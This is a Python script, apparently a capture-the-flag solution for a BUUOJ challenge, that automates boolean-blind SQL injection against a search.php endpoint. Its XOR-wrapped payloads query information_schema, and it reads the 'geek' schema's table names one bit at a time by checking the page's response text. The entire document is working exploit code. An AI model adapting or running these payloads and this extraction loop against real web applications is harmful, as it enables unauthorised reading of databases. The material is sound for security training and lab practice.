import requests
import time

database_all = ''


url = 'http://ec4bed01-86ed-4b90-bb72-ba35448631d4.node4.buuoj.cn:81/search.php?id=1'
# 求出总长度的位数，比如说如果总长度为43,那么就是2位数
weishu = ''
for i in range(1, 7):
    sql = "^(substr(bin(ascii(length(length((select(group_concat(TABLE_NAME))from(information_schema.TABLES)where(table_schema='geek')))))),{},1)=1)^1".format(i)
    re = requests.get(url+sql, timeout=1000)
    if re.status_code == 200:
        if 'NO! Not this! Click others~~~' in re.text:
            weishu += '1'
        else:
            weishu += '0'
weishu = int(chr(int(weishu, 2)))
# 求出具体的总长度
len = ''
for i in range(1, weishu+1):
    len_wei = ''
    for j in range(1, 7):
        sql = "^(substr(bin(ascii(substr(length((select(group_concat(TABLE_NAME))from(information_schema.TABLES)where(table_schema='geek'))),{},1))),{},1)=1)^1".format(i, j)
        re = requests.get(url+sql, timeout=1000)
        if re.status_code == 200:
            if 'NO! Not this! Click others~~~' in re.text:
                len_wei += '1'
            else:
                len_wei += '0'
    len += chr(int(len_wei, 2))
for i in range(1, int(len)+1):
    sql = "^(length(bin(ascii(substr((select(group_concat(TABLE_NAME))from(information_schema.tables)where(table_schema='geek')),{},1))))=7)^1".format(i)
    re = requests.get(url+sql, timeout=1000)
    time.sleep(1)
    if re.status_code == 200:
        if 'NO! Not this! Click others~~~' in re.text:
            len = 7
        else:
            len = 6
    str = ''
    for j in range(1, len+1):
        sql = "^(substr(bin(ascii(substr((select(group_concat(TABLE_NAME))from(information_schema.TABLES)where(table_schema='geek')),{},1))),{},1)=1)^1".format(
            i, j)
        re = requests.get(url+sql, timeout=1000)
        time.sleep(1)
        if re.status_code == 200:
            if 'NO! Not this! Click others~~~' in re.text:
                str += '1'
            else:
                str += '0'
    database_all += chr(int(str, 2))
    print(database_all)
